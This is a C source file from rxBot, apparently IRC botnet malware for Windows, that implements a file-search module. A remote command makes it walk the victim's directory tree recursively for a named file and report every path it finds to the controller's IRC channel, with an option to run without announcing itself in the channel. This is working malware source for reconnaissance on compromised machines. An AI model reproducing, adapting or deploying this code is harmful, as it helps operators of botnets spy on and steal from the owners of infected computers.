/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_FINDFILE

DWORD WINAPI FindFileThread(LPVOID param) 
{
	FFIND ffind = *((FFIND *)param);
	FFIND *ffinds = (FFIND *)param;
	ffinds->gotinfo = TRUE;

	char sendbuf[IRCLINE];
	unsigned int numfound = 0;

	if (ffind.dirname[strlen(ffind.dirname)-1] == '\\')
		ffind.dirname[strlen(ffind.dirname)-1] = '\0';
	
	_snprintf(sendbuf,sizeof(sendbuf),"[FINDFILE]: Searching for file: %s.",ffind.filename);
	if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);

	numfound = FindFile(ffind.sock,ffind.chan,ffind.notice,ffind.filename,ffind.dirname,numfound);
	sprintf(sendbuf,"[FINDFILE]: Files found: %d.",numfound);
	if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);
	addlog(sendbuf);

	clearthread(ffind.threadnum);

	ExitThread(0);
}

unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound)
{
	char sendbuf[IRCLINE], tmpPath[MAX_PATH], newPath[MAX_PATH];

	WIN32_FIND_DATA fd;
	HANDLE fh;

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.')) {
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname,fd.cFileName);
					numfound = FindFile(sock, chan, notice, filename, newPath, numfound);			
				}
			}
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			numfound ++;
			_snprintf(sendbuf,sizeof(sendbuf)," Found: %s\\%s",dirname,fd.cFileName);
			irc_privmsg(sock,chan,sendbuf,notice, TRUE);
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	return (numfound);
}
#endif
